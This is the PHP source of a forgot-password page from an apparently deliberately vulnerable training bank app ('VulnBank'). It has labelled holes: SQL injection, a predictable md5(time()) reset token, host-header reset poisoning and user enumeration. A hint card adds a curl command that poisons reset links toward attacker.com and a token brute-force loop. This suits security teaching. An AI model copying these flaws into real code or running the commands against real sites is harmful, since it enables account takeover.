<?php
// ============================================================
//  VulnBank – Forgot Password
//  CWE-644: Host Header Injection → Password Reset Poisoning
//  CWE-330: Predictable Reset Token via md5(time() + email)
//  CWE-204: Username Enumeration via Differential Response
// ============================================================
require_once 'db.php';
if (session_status() === PHP_SESSION_NONE) session_start();

$msg = $error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');

    $user = db()->query("SELECT * FROM users WHERE email = '" . $email . "'")->fetch(); // also SQLi

    if ($user) {
        // CWE-330: PREDICTABLE TOKEN — md5(time()) has 1-second granularity
        // An attacker who knows the approximate request time can try all
        // md5(time()) values within a ±60 second window (only 120 candidates)
        $token = md5(time() . $email);  // ← weak: time-based, email is known

        // Store token (plaintext, not hashed)
        db()->prepare(
            "INSERT INTO reset_tokens (user_id, token, expires_at) VALUES (?, ?, datetime('now','+1 hour'))"
        )->execute([$user['id'], $token]);

        // CWE-644: HOST HEADER INJECTION
        // $_SERVER['HTTP_HOST'] is attacker-controlled.
        // Send request with: Host: attacker.com
        // The victim receives a reset email pointing to attacker.com
        $host      = $_SERVER['HTTP_HOST'];      // ← attacker-controlled
        $x_host    = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? $host; // also injectable
        $reset_url = "http://{$x_host}/reset_token.php?token={$token}";

        // Simulate sending email (in real app this would call mail())
        // CWE-204: DIFFERENT message for valid vs invalid email → enumeration
        $msg = "✅ Password reset link sent to <strong>" . htmlspecialchars($email) . "</strong><br>
                <small class='text-muted'>(Demo: token = <code>$token</code> | URL = <code>" . htmlspecialchars($reset_url) . "</code>)</small>";
    } else {
        // CWE-204: Different message reveals the email is NOT registered
        $error = "❌ No account found with that email address.";
        // FIX would be: always return the same message regardless
    }
}

require '_header.php';
?>

<div class="row justify-content-center">
  <div class="col-md-6">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">CWE-644 Host Header Injection</span>
      <span class="badge-vuln">CWE-330 Weak Token</span>
      <span class="badge-vuln">CWE-204 User Enumeration</span>
    </div>

    <div class="card shadow">
      <div class="card-header">Forgot Password</div>
      <div class="card-body">
        <?php if ($error): ?><div class="alert alert-danger"><?= $error ?></div><?php endif; ?>
        <?php if ($msg):   ?><div class="alert alert-info"><?= $msg ?></div><?php endif; ?>

        <form method="POST">
          <div class="form-group mb-3">
            <label>Email Address</label>
            <input type="email" name="email" class="form-control"
                   placeholder="alice@example.com" required>
            <small class="text-muted">Known emails: alice@example.com · bob@example.com · admin@vulnbank.local</small>
          </div>
          <button class="btn btn-primary w-100">Send Reset Link</button>
        </form>
        <p class="text-center mt-2"><a href="index.php">Back to Login</a></p>
      </div>
    </div>

    <div class="card mt-3 hint-card shadow-sm">
      <div class="card-body" style="font-size:.8rem">
        <strong>CWE-644 Host Header Poisoning exploit:</strong><br>
        <code>curl -X POST http://localhost:8080/forgot.php \<br>
        &nbsp;&nbsp;-H "Host: attacker.com" \<br>
        &nbsp;&nbsp;-d "email=alice@example.com"</code><br>
        → Alice receives email with link to <code>http://attacker.com/reset_token.php?token=...</code><br><br>
        <strong>CWE-330 Token brute-force:</strong><br>
        Token = <code>md5(time() . email)</code>. Try all timestamps ±60s:<br>
        <code>for t in $(seq $(($(date +%s)-60)) $(($(date +%s)+60))); do echo -n "$t" | md5sum; done</code><br><br>
        <strong>CWE-204 Enumeration:</strong> Valid email → "link sent", invalid → "no account found".
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
